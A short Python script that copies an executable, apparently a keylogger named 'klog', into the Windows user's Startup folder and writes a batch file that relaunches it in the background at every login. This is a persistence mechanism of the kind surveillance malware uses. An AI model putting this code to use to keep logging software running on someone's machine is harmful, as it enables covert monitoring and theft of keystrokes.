from shutil import copyfile
from os import path
import subprocess
import getpass

USER_NAME = getpass.getuser()

def add_to_startup(file_name):
  startup_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME

  bat_file = "{0}.bat".format(file_name)
  exe_file = "{0}.exe".format(file_name)
  exe_path = './dist/' + exe_file

  if path.isfile(exe_path) or path.isfile(exe_file):

    with open(startup_path + '\\' + bat_file, "w+") as bat_script:
      bat_script.write('start /B "" "{0}\\{1}"\nexit 0\n'.format(startup_path, exe_file))

    if path.isfile(exe_file): # If the other exe is in the same folder change exe_path value
      exe_path = exe_file

    copyfile(exe_path, startup_path + '\\' + exe_file) # Copy this exe to startup folder
    subprocess.Popen('explorer "{0}"'.format(startup_path), shell=False) # Opens file manager at desired folder

  else:
    print("Executable doesn't exists")

add_to_startup("klog")
